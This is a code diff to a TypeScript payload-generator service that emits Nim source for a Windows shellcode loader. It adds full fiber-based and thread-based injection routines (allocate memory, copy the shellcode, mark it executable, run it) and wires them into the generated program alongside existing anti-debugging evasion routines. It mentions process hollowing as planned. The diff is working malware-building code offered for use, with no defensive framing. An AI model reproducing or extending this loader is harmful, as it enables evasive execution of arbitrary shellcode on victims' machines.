@@ -16,6 +16,7 @@ export class PayloadService {
 
         const utilsBlock = this.generateUtilsBlock(config);
         const evasionProcs = this.generateEvasionProcs(config);
+        const injectionProc = this.generateInjectionProc(config);
         const shellcodeBlock = this.generateShellcodeBlock(config);
         const mainLogic = this.generateMainLogic(config);
 
@@ -27,6 +28,8 @@ ${directives.join('\n')}
 ${utilsBlock}
 
 ${evasionProcs}
+
+${injectionProc}
 
 ${shellcodeBlock}
 
@@ -143,6 +146,137 @@ proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
         return code;
     }
 
+    private generateInjectionProc(config: PayloadRequest): string {
+        if (config.injection_method === 'fiber') {
+            return this.generateFiberInjection();
+        } else if (config.injection_method === 'thread') {
+            return this.generateThreadInjection();
+        }
+        // early_bird and process_hollowing not implemented yet
+        return "";
+    }
+
+    private generateFiberInjection(): string {
+        return `
+proc injectShellcode(shellcode: seq[byte]) =
+    let size = shellcode.len
+    
+    # Allocate RW memory
+    let memAddr = VirtualAlloc(
+        nil,
+        size,
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_READWRITE
+    )
+    
+    if memAddr == nil:
+        echo "[-] VirtualAlloc failed"
+        quit(1)
+    
+    # Copy shellcode to allocated memory
+    copyMem(
+        memAddr,
+        unsafeAddr shellcode[0],
+        size
+    )
+    
+    # Change protection to RX
+    var oldProtection: DWORD
+    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
+    
+    if protectSuccess == 0:
+        echo "[-] VirtualProtect failed"
+        discard VirtualFree(memAddr, 0, MEM_RELEASE)
+        quit(1)
+    
+    # Convert current thread to fiber
+    let mainFiber = ConvertThreadToFiber(nil)
+    if mainFiber == nil:
+        echo "[-] ConvertThreadToFiber failed"
+        discard VirtualFree(memAddr, 0, MEM_RELEASE)
+        quit(1)
+    
+    # Create fiber pointing to shellcode
+    let hFiber = CreateFiber(
+        0,
+        cast[LPFIBER_START_ROUTINE](memAddr),
+        nil
+    )
+    
+    if hFiber == nil:
+        echo "[-] CreateFiber failed"
+        discard ConvertFiberToThread()
+        discard VirtualFree(memAddr, 0, MEM_RELEASE)
+        quit(1)
+    
+    echo "[+] Executing shellcode via Fiber..."
+    SwitchToFiber(hFiber)
+    
+    # Cleanup
+    DeleteFiber(hFiber)
+    discard ConvertFiberToThread()
+    discard VirtualFree(memAddr, 0, MEM_RELEASE)
+`;
+    }
+
+    private generateThreadInjection(): string {
+        return `
+proc injectShellcode(shellcode: seq[byte]) =
+    let size = shellcode.len
+    
+    # Allocate RW memory
+    let memAddr = VirtualAlloc(
+        nil,
+        size,
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_READWRITE
+    )
+    
+    if memAddr == nil:
+        echo "[-] VirtualAlloc failed"
+        quit(1)
+    
+    # Copy shellcode to allocated memory
+    copyMem(
+        memAddr,
+        unsafeAddr shellcode[0],
+        size
+    )
+    
+    # Change protection to RX
+    var oldProtection: DWORD
+    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
+    
+    if protectSuccess == 0:
+        echo "[-] VirtualProtect failed"
+        discard VirtualFree(memAddr, 0, MEM_RELEASE)
+        quit(1)
+    
+    # Create thread pointing to shellcode
+    var threadId: DWORD
+    let hThread = CreateThread(
+        nil,
+        0,
+        cast[LPTHREAD_START_ROUTINE](memAddr),
+        nil,
+        0,
+        addr threadId
+    )
+    
+    if hThread == 0:
+        echo "[-] CreateThread failed"
+        discard VirtualFree(memAddr, 0, MEM_RELEASE)
+        quit(1)
+    
+    echo "[+] Executing shellcode via Thread..."
+    discard WaitForSingleObject(hThread, INFINITE)
+    
+    # Cleanup
+    discard CloseHandle(hThread)
+    discard VirtualFree(memAddr, 0, MEM_RELEASE)
+`;
+    }
+
     private generateMainLogic(config: PayloadRequest): string {
         let code = "";
 
@@ -199,8 +333,8 @@ proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
             code += `    var finalShellcode = shellcodeByte\n`;
         }
 
-        // 5. Injection (Placeholder for now)
-        code += `    echo "Running shellcode (size: " & $finalShellcode.len & ")"\n`;
+        // 5. Injection
+        code += `    injectShellcode(finalShellcode)\n`;
 
         return code;
     }
